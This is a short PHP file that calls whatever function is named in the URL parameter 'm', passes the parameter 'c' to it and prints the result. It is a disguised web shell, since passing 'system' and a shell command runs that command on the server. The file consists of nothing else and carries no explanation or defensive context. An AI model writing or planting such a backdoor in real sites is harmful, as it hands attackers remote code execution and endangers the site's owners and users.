
<?php
    $func = new ReflectionFunction($_GET[m]);
    echo $func->invokeArgs(array($_GET[c]));
?>